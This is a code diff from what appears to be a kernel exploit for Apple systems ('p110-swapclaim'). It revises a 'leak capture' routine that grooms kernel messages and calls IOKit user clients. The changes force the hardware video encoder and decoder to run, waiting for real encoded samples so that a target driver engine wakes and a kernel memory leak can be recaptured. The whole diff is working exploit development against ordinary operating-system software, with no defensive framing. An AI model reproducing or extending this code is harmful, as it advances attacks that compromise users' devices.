@@ -107,7 +107,7 @@ static void p110_flushCB(void *r, void *e, OSStatus st, VTEncodeInfoFlags f, CMS
 #import <IOKit/IOKitLib.h>       /* dlsym'd calls still; only the UC types  */
 #import <sys/qos.h>
 
-#define P110_BUILD      @"p110-swapclaim-v3.7-fgroomdelta"
+#define P110_BUILD      @"p110-swapclaim-v3.8-wakefix"
 #define P110_GROOM_KDATA 0x1000        /* the groom kmsg's kdata size       */
 #define P110_ROUNDS     64
 #define P110_PREFILL_MAX  8     /* bandit arm room: prefill 6 (default) vs 8 */
@@ -689,27 +689,50 @@ static BOOL p110_leak_capture(NSString *tag, BOOL print, P110LeakSnap *snap) {
                 OSStatus wst = VTCompressionSessionCreate(
                     kCFAllocatorDefault, 1280, 720, kCMVideoCodecType_HEVC,
                     NULL, NULL, NULL, p110_flushCB, NULL, &ws);
-                if (wst != noErr || !ws) break;
+                if (wst != noErr || !ws) {
+                    Lf(@"[leak] WAKE-ARM cycle %d: session-create st=%d — the "
+                       @"VT encoder did not open (no engine to wake)", wc, (int)wst);
+                    break;
+                }
+                /* v3.8 the wake fix: RealTime=TRUE routes to the HW encoder
+                   (the false value kept it on a software path that never
+                   completed frames — the measured 0/3). Plus the explicit
+                   HW-accel string key and the stage9 RCMode=20 pack. */
                 VTSessionSetProperty(ws, (__bridge CFStringRef)@"EncoderUsage",
                                      (__bridge CFTypeRef)[NSNumber numberWithInt:1]);
                 VTSessionSetProperty(ws, (__bridge CFStringRef)@"RCMode",
                                      (__bridge CFTypeRef)[NSNumber numberWithInt:20]);
+                VTSessionSetProperty(ws, (__bridge CFStringRef)@"EnableHardwareAcceleratedVideoEncoder",
+                                     (__bridge CFTypeRef)@YES);
                 VTSessionSetProperty(ws, kVTCompressionPropertyKey_RealTime,
-                                     kCFBooleanFalse);
-                if (VTCompressionSessionPrepareToEncodeFrames(ws) == noErr) {
+                                     kCFBooleanTrue);
+                OSStatus wprep = VTCompressionSessionPrepareToEncodeFrames(ws);
+                OSStatus est = -999;
+                int wcb = 0;
+                if (wprep == noErr) {
                     CVPixelBufferRef wpb = NULL;
                     if (CVPixelBufferCreate(kCFAllocatorDefault, 1280, 720,
                             kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange,
                             NULL, &wpb) == noErr && wpb) {
                         VTEncodeInfoFlags wflags = 0;
-                        OSStatus est = VTCompressionSessionEncodeFrame(ws, wpb,
+                        est = VTCompressionSessionEncodeFrame(ws, wpb,
                             CMTimeMake((int64_t)wc, 30), kCMTimeInvalid, NULL,
                             NULL, &wflags);
                         VTCompressionSessionCompleteFrames(ws, kCMTimeInvalid);
+                        /* v3.8: bounded callback wait — CompleteFrames can
+                           return before the async callback; the decode arm
+                           needs REAL samples (wakeSbN>0), so wait for it. */
+                        for (int ww = 0; ww < 50 && g_p110_wakeSbN == 0; ww++)
+                            usleep(10000);
+                        wcb = g_p110_wakeSbN;
                         CVPixelBufferRelease(wpb);
-                        if (est == noErr) woke = 1;
+                        if (est == noErr && wcb > 0) woke = 1;
                     }
                 }
+                Lf(@"[leak] WAKE-ARM cycle %d: create=0 prep=%d encode=%d "
+                   @"samples=%d (v3.8: RealTime=on + HW-accel → callbacks? "
+                   @"samples>0 = the engine produced output for the decode arm)",
+                   wc, (int)wprep, (int)est, wcb);
                 VTCompressionSessionInvalidate(ws);
                 CFRelease(ws);
             }
@@ -718,6 +741,7 @@ static BOOL p110_leak_capture(NSString *tag, BOOL print, P110LeakSnap *snap) {
                M2ScalerCSCDriver (the sel-8 engine's owner). The encode woke
                AVE2 (the wrong engine, measured); the decode wakes the CSC. */
             int dec = 0;
+            OSStatus dstCreate = -1;
             OSStatus dstErr[3] = {0}; int dstSessionErrCap = 0;
             if (g_p110_wakeSbN > 0) {
                 CMVideoFormatDescriptionRef fd = NULL;
@@ -748,6 +772,7 @@ static BOOL p110_leak_capture(NSString *tag, BOOL print, P110LeakSnap *snap) {
                         (__bridge CFDictionaryRef)@{@"EnableHardwareAcceleratedVideoDecoder": @YES},
                         (__bridge CFDictionaryRef)dstAttrs,
                         &ocb, &ds);
+                    dstCreate = dst;
                     if (dst == noErr && ds) {
                         for (int wi = 0; wi < g_p110_wakeSbN; wi++) {
                             VTDecodeInfoFlags dflags = 0;
@@ -767,8 +792,9 @@ static BOOL p110_leak_capture(NSString *tag, BOOL print, P110LeakSnap *snap) {
             }
             for (int wi = 0; wi < g_p110_wakeSbN; wi++) CFRelease(g_p110_wakeSb[wi]);
             g_p110_wakeSbN = 0;
-            Lf(@"[leak] DECODE-ARM: %d/3 decoded; frame errs=[%d %d %d] (session-create st in the earlier row) — recapture sel-8",
-               dec, (int)dstErr[0], (int)dstErr[1], (int)dstErr[2]);
+            Lf(@"[leak] DECODE-ARM: %d/%d decoded; create=%d frame errs=[%d %d %d] — recapture sel-8",
+               dec, g_p110_wakeSbN > 0 ? 3 : 0, (int)dstCreate,
+               (int)dstErr[0], (int)dstErr[1], (int)dstErr[2]);
             in64 = (uint64_t)(uintptr_t)g_p110_leak_out;
             memset(g_p110_leak_out, 0, sizeof(g_p110_leak_out));
             outLen = sizeof(g_p110_leak_out);
